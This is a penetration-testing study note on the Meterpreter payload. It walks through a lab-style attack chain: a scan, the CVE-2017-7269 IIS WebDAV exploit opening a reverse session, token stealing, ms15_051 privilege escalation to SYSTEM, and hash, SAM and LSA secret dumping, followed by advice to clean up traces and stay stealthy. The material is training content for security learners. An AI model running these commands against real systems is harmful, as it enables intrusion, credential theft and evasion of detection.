## 🔥 What is Meterpreter?

- **Meterpreter** is:
    
    - A **multi-functional, extensible payload**
        
    - Uses **DLL injection**
        
    - Runs entirely in **memory (no disk traces)**
        

👉 In simple terms:  
**Meterpreter = Advanced post-exploitation shell**

---

## 🧠 Key Features

✔️ In-memory execution  
✔️ AES encrypted communication  
✔️ No files written to disk  
✔️ Highly stealthy  
✔️ Supports persistence

---

## 🖥️ Meterpreter Architecture

![Image](https://www.trendmicro.com/content/dam/trendmicro/global/en/migrated/trendlabs-security-intelligence-07/files/2020/05/Fig-1-Netwalker.jpg)

![Image](https://www.hackthebox.com/storage/blog/YnHEQmhMyFQOFq6EfH5B4xV1NO5d7YPL.jpg)

![Image](https://www.techrxiv.org/users/806772/articles/1277797/master/file/figures/image2/image2.png)

![Image](https://miro.medium.com/1%2AGIUlGPOhxkq2Mi6QJSSKxA.png)

✔️ Flow:

1. Stager executes
    
2. Reflective DLL injection
    
3. AES encrypted connection
    
4. Extensions loaded
    

---

## ⚙️ How Meterpreter Works

When exploit runs:

1. **Stager executes**
    
    - reverse / bind shell
        
2. **Reflective DLL Injection**
    
    - Loads Meterpreter in memory
        
3. **Connection Established**
    
    - AES encrypted communication
        
4. **Extensions Loaded**
    
    - `stdapi` (default)
        
    - `priv` (if admin access)
        

---

## 🧬 Why Meterpreter is Powerful

### 🔹 Stealthy

- Runs in memory
    
- No disk artifacts
    
- Injects into existing process
    
- Can migrate between processes
    

✔️ Hard to detect with forensic tools

---

### 🔹 Powerful

- Uses **channelized communication**
    
- Can:
    
    - Spawn shells
        
    - Execute commands
        
    - Interact deeply with OS
        

---

### 🔹 Extensible

- Load extensions dynamically
    
- Add features without rebuilding
    

---

## 🧰 Meterpreter Commands

```bash
meterpreter > help
```

### 🔹 Core Commands:

- `background` → Background session
    
- `migrate` → Move to another process
    
- `load` → Load extensions
    
- `run` → Execute scripts/modules
    
- `sessions` → Switch sessions
    
- `getuid` → Show current user
    
- `exit` → Close session
    

---

## 🎯 Real Attack Workflow Example

---

### 🔍 Step 1: Scan Target

```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
```

✔️ Found:

- Port 80 → Microsoft IIS 6.0
    

---

### 🔎 Step 2: Search Exploit

```bash
search iis_webdav_upload_asp
```

✔️ Vulnerability:

- CVE-2017-7269
    

---

### ⚙️ Step 3: Configure Exploit

```bash
set RHOST 10.10.10.15
set LHOST tun0
run
```

✔️ Result:

```bash
Meterpreter session 1 opened
```

---

## ⚠️ Important Observation

- Exploit uploads `.asp` file:
    
    - Example: `metasploitXXXXX.asp`
        

❌ Deletion may fail  
✔️ Leaves trace on system

👉 Important for:

- Detection
    
- Forensics
    

---

## 🔄 Privilege Escalation Process

---

### 🔹 Check User

```bash
getuid
```

❌ Access denied

---

### 🔹 View Processes

```bash
ps
```

---

### 🔹 Steal Token

```bash
steal_token 1836
```

✔️ Result:

```bash
NT AUTHORITY\NETWORK SERVICE
```

---

## 🔍 Explore System

```bash
dir
cd AdminScripts
```

❌ Access denied

---

## 🧠 Use Local Exploit Suggester

```bash
search local_exploit_suggester
set SESSION 1
run
```

✔️ Finds vulnerabilities:

- ms15_051
    
- ms14_058
    
- ms16_016
    

---

## 🚀 Privilege Escalation Exploit

```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
run
```

✔️ Result:

```bash
NT AUTHORITY\SYSTEM
```

👉 Full system access achieved

---

## 🔐 Dumping Credentials

---

### 🔹 Hash Dump

```bash
hashdump
```

✔️ Extracts:

- User hashes
    
- NTLM credentials
    

---

### 🔹 SAM Dump

```bash
lsa_dump_sam
```

✔️ Extracts:

- Local account hashes
    

---

### 🔹 LSA Secrets

```bash
lsa_dump_secrets
```

✔️ Extracts:

- Stored passwords
    
- System secrets
    

---

## 🧠 Post-Exploitation Capabilities

![Image](https://cymulate.com/uploaded-files/2025/05/Credential-Dumping-Attack-Flow.png)

![Image](https://cdn.prod.website-files.com/64149f8bba6c132029e75004/67812e52ae253378cc143f25_Pivoting%20vs%20Lateral%20Movement%20in%20Cyber%20Security%20-%20Compressed.webp)

![Image](https://images.ctfassets.net/xqb1f63q68s1/nhuDXXfvevxejFtmrUrmz/21314719deb148678760eb84e74be674/How_credential_stuffing_works.png)

![Image](https://imagedelivery.net/KxWh-mxPGDbsqJB3c5_fmA/3b253c1e-5b2b-4117-2aef-873cdeb7d000/public)

✔️ Meterpreter allows:

- Credential dumping
    
- Privilege escalation
    
- Process impersonation
    
- Pivoting to other systems
    
- Persistence
    

---

## ⚠️ Important Notes (Keep These)

✔️ Meterpreter:

- Runs entirely in memory
    
- Uses AES encryption
    
- Leaves minimal traces
    

✔️ BUT:

- Exploits may leave artifacts (e.g., .asp file)
    

✔️ Always:

- Clean up traces
    
- Maintain stealth
    

---

## 🧾 Summary

|Feature|Description|
|---|---|
|Meterpreter|Advanced payload|
|Execution|In-memory|
|Communication|AES encrypted|
|Capability|Post-exploitation|
|Strength|Stealth + power|

---
